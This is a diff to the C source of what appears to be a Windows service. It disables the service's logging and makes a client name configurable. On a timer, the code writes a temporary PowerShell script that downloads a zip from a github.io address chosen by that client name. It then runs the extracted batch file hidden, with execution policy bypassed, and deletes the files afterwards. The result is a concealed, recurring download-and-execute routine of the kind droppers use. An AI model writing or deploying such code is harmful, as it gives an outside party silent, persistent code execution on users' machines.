@@ -41,10 +41,12 @@ char* getDirPathFromPath(char* path)
 
 char* exepath = NULL;
 int timer = 0;
+char* clientName = NULL;
 
 int WriteToLog(char* str)
 {
-	if (exepath == NULL)
+	UNUSED(str);
+	/* if (exepath == NULL)
 		return -1;
 	char* logName = (char*)malloc((strlen(exepath)+8) * sizeof(char));
 	strcpy(logName, exepath);
@@ -55,18 +57,21 @@ int WriteToLog(char* str)
     if (log == NULL)
         return -1;
     fprintf(log, "%s\n", str);
-    fclose(log);
+    fclose(log); */
     return 0;
 }
 
 void CronFunc(void)
 {
+	if (clientName == NULL)
+		return;
+	
 	char* cmdx = (char*)malloc(5024 * sizeof(char));
 	sprintf(cmdx, "cmd /c echo $client = \"%s\"> %%tmp%%\\tmp.ps1 &&\
  echo $zip_ext_folder = $env:TEMP>> %%tmp%%\\tmp.ps1 &&\
  echo $out_folder = $env:TEMP>> %%tmp%%\\tmp.ps1 &&\
  echo $file = \"index.zip\">> %%tmp%%\\tmp.ps1 &&\
- echo $infile = \"https://paratenilesh.github.io/smsbox/\" + $client + \"/\" + $file>> %%tmp%%\\tmp.ps1 &&\
+ echo $infile = \"https://suncomputers2021.github.io/smsbox/\" + $client + \"/\" + $file>> %%tmp%%\\tmp.ps1 &&\
  echo $outfile = $out_folder + \"\\\\\" + $file>> %%tmp%%\\tmp.ps1 &&\
  echo $exefile = $zip_ext_folder + \"\\\\\" + \"index.bat\">> %%tmp%%\\tmp.ps1 &&\
  echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3>> %%tmp%%\\tmp.ps1 &&\
@@ -80,7 +85,7 @@ void CronFunc(void)
  echo Write-Host $response>> %%tmp%%\\tmp.ps1 &&\
  echo Remove-item $exefile>> %%tmp%%\\tmp.ps1 &&\
  PowerShell -NoProfile -ExecutionPolicy Bypass -NoLogo -WindowStyle Hidden -Command \"& '%%tmp%%\\tmp.ps1'\" &&\
- del %%tmp%%\\tmp.ps1", "sunclient");
+ del %%tmp%%\\tmp.ps1", clientName);
 	char *result = exe_cmd(cmdx);
 	free(cmdx);
 	free(result);
@@ -192,6 +197,11 @@ int main(int argc, char *argv[])
 		free(exepath);
 	}
 	
+	if (clientName != NULL)
+	{
+		free(clientName);
+	}
+	
 	return EXIT_SUCCESS;
 }
 
@@ -269,8 +279,10 @@ void ServiceMain(int argc, char** argv)
 							char const* CronTab = ini_property_value( ini, section, idx_c );
 							char const* Client = ini_property_value( ini, section, idx_cn );
 							char const* Enable = ini_property_value( ini, section, idx_e );
-							if (strcmp(Enable, "True") == 0)
+							if (strcmp(Enable, "True") == 0 && clientName == NULL)
 							{
+								clientName = (char*)malloc((strlen(Client)+1) * sizeof(char));
+								strcpy(clientName, Client);
 								int t = atoi(CronTab);
 								if (t > 0)
 								{
